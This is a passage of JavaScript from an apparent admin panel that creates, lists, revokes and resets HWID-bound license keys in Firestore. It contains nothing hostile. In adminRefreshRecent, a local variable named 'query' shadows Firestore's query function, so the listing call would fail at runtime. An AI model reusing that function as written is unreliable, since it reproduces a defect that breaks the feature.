    <div><b>Email:</b> ${_escape(rec.email||"-")}</div>
    <div><b>Expiry:</b> ${_escape(exp)}</div>
    <div><b>Status:</b> ${_escape(status)}</div>
    <div><b>Used By:</b> ${_escape(rec.usedEmail||rec.usedBy||"-")}</div>
    <div><b>HWID:</b> ${rec.hwidHash ? "Bound" : "-"}</div>
  `;
}

async function adminRefreshRecent(){
  if (typeof collection !== "function" || typeof getDocs !== "function") return;
  const query = (document.getElementById('adminLicenseSearchEmail')?.value || '').trim().toLowerCase();
const tbody = document.getElementById("licTable");
  if(!tbody) return;
  tbody.innerHTML = `<tr><td colspan="5" style="padding:10px;opacity:.7;">Loading...</td></tr>`;
  try{
    const qy = query(collection(db,"licenses"), orderBy("createdAt","desc"), limit(50));
    const snaps = await getDocs(qy);
    const rows=[];
    snaps.forEach(s=>{
      const d=s.data()||{};
      const exp = d.expiresAt ? _toIso(d.expiresAt) : "-";
      const status = d.revokedAt ? "REVOKED" : ((d.active===false) ? "DISABLED" : (d.used ? "USED" : "READY"));
      rows.push(`
        <tr style="border-top:1px solid rgba(255,255,255,.06); cursor:pointer;" data-key="${_escape(s.id)}">
          <td style="padding:8px; font-family:ui-monospace;">${_escape(s.id)}</td>
          <td style="padding:8px;">${_escape(d.email||"-")}</td>
          <td style="padding:8px;">${_escape(exp)}</td>
          <td style="padding:8px;">${_escape(status)}</td>
          <td style="padding:8px;">${d.hwidHash ? "‚úÖ" : "-"}</td>
        </tr>
      `);
    });
    tbody.innerHTML = rows.length ? rows.join("") : `<tr><td colspan="5" style="padding:10px;opacity:.7;">No licenses</td></tr>`;
    tbody.querySelectorAll("tr[data-key]").forEach(tr=>{
      tr.addEventListener("click", async ()=>{
        const key = tr.getAttribute("data-key");
        document.getElementById("licKey").value = key;
        const rec = await adminLoadLicense(key);
        adminRenderLicenseInfo(rec);
      });
    });
  }catch(e){
    console.error(e);
    tbody.innerHTML = `<tr><td colspan="5" style="padding:10px;opacity:.7;">Failed to load</td></tr>`;
  }
}

function adminInitLicenseManager(){
  const createBtn = document.getElementById("licCreateBtn");
  const out = document.getElementById("licCreateOut");
  const loadBtn = document.getElementById("licLoadBtn");
  const refreshBtn = document.getElementById("licRefreshBtn");

  let currentRec = null;

  createBtn?.addEventListener("click", async ()=>{
    try{
      const email = (document.getElementById("licEmail").value||"").trim();
      const daysStr = (document.getElementById("licDays").value||"").trim();
      const days = daysStr ? Math.max(1, parseInt(daysStr,10)) : null;

      const key = _randKey(24);
      const payload = {
        active: true,
        used: false,
        email: email || null,
        createdAt: serverTimestamp(),
        createdBy: (window.currentDiscordId || null),
      };
      if(days){
        const ms = days*24*60*60*1000;
        payload.expiresAt = Timestamp.fromDate(new Date(Date.now()+ms));
      }
      await setDoc(doc(db,"licenses", key), payload);

      out.style.display="block";
      out.textContent = key;
      try{ await navigator.clipboard.writeText(key); }catch(e){}
      if(window.h89Notify) h89Notify("success","License created", "Key copied to clipboard.");
      await adminRefreshRecent();
    }catch(e){
      console.error(e);
      if(window.h89Notify) h89Notify("error","Create failed", "Check console.");
    }
  });

  loadBtn?.addEventListener("click", async ()=>{
    const key = (document.getElementById("licKey").value||"").trim();
    if(!key) return;
    const rec = await adminLoadLicense(key);
    currentRec = rec;
    adminRenderLicenseInfo(rec);
    if(!rec && window.h89Notify) h89Notify("warn","Not found", "Invalid key.");
  });

  document.getElementById("licRevokeBtn")?.addEventListener("click", async ()=>{
    if(!currentRec) return;
    await updateDoc(doc(db,"licenses", currentRec.key), { active:false, revokedAt: serverTimestamp(), revokedBy:(window.currentDiscordId||null) });
    currentRec = await adminLoadLicense(currentRec.key);
    adminRenderLicenseInfo(currentRec);
    if(window.h89Notify) h89Notify("info","Revoked", "License revoked.");
    await adminRefreshRecent();
  });

  document.getElementById("licUnrevokeBtn")?.addEventListener("click", async ()=>{
    if(!currentRec) return;
    await updateDoc(doc(db,"licenses", currentRec.key), { active:true, revokedAt: deleteField(), revokedBy: deleteField() });
    currentRec = await adminLoadLicense(currentRec.key);
    adminRenderLicenseInfo(currentRec);
    if(window.h89Notify) h89Notify("success","Enabled", "License enabled.");
    await adminRefreshRecent();
  });

  document.getElementById("licResetHwidBtn")?.addEventListener("click", async ()=>{
    if(!currentRec) return;
    await updateDoc(doc(db,"licenses", currentRec.key), {
      used:false,
      usedBy: deleteField(),
      usedEmail: deleteField(),
      usedAt: deleteField(),
      hwidHash: deleteField()
    });
    currentRec = await adminLoadLicense(currentRec.key);
    adminRenderLicenseInfo(currentRec);
    if(window.h89Notify) h89Notify("success","Reset", "HWID & usage cleared.");
    await adminRefreshRecent();
  });

  document.getElementById("licSetExpiryBtn")?.addEventListener("click", async ()=>{
    if(!currentRec) return;
    const daysStr = (document.getElementById("licSetDays").value||"").trim();
    const days = daysStr ? Math.max(1, parseInt(daysStr,10)) : null;
    if(!days) return;
    const ms = days*24*60*60*1000;
    await updateDoc(doc(db,"licenses", currentRec.key), { expiresAt: Timestamp.fromDate(new Date(Date.now()+ms)) });
    currentRec = await adminLoadLicense(currentRec.key);
    adminRenderLicenseInfo(currentRec);
    if(window.h89Notify) h89Notify("success","Expiry set", `${days} day(s)`);
    await adminRefreshRecent();
  });

  refreshBtn?.addEventListener("click", adminRefreshRecent);

  // initial
  adminRefreshRecent();
}

// call init once DOM ready (admin panel exists always)
setTimeout(()=>{ /* adminInitLicenseManager disabled in TriggerFinder build (requires admin Firestore context) */ }, 500);
</script>
